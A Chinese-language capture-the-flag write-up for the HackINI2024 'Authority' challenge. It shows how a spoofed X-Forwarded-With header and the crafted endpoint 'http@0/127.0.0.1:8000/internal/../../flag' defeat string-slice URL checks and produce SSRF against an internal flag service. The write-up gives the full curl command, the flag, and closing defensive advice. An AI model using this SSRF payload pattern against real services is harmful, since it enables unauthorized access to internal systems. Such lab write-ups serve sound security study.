# HackINI2024 Authority

## 题目简述

外部 Express 服务提供 `/request`，要求请求头 `X-Forwarded-With` 等于 `127.0.0.1`，并只允许抓取看似以 `127.0.0.1:8000/internal` 开头的 URL。容器内另有一个监听 80 端口、在 `/flag` 返回 flag 的隐藏服务。目标是同时绕过伪造来源检查和脆弱的字符串 URL 校验，触发 SSRF。

## 解题过程

第一层检查完全信任客户端可控请求头：

```javascript
if (req.header('X-Forwarded-With') != "127.0.0.1") {
    res.status(401).send("...")
}
```

因此直接添加：

```http
X-Forwarded-With: 127.0.0.1
```

第二层没有用 URL 解析器验证主机，而是检查固定下标：

```javascript
url.substring(0, 4) === "http"
url.substring(7, legit_url.length + 7) ===
    "127.0.0.1:8000/internal"
```

构造以下 endpoint：

```text
http@0/127.0.0.1:8000/internal/../../flag
```

它的前 4 字符是 `http`，从下标 7 开始也确实出现允许字符串，所以通过校验。但交给 libcurl 后，`http@0` 被解释为用户信息和主机 `0`；主机 `0` 在本地解析为 `0.0.0.0`，连接到容器的 80 端口。路径规范化又把 `/127.0.0.1:8000/internal/../../flag` 化为 `/flag`，最终命中隐藏服务。

完整请求可写为：

```bash
curl -G 'http://TARGET/request' \
  -H 'X-Forwarded-With: 127.0.0.1' \
  --data-urlencode \
  'endpoint=http@0/127.0.0.1:8000/internal/../../flag'
```

响应中得到：

```text
shellmates{userinf0_1n_HtTp_Uri_To0??}
```

## 方法总结

本题结合了两个信任错误：把可伪造的转发头当作来源证明，以及用字符串切片代替 URL 语义校验。不同解析器对 userinfo、纯数字主机和路径规范化的理解会改变实际请求目标。防御时应在可信反向代理处覆盖转发头，用标准 URL 解析器取得最终 host、port 和解析后的 IP，并采用明确的目标白名单。
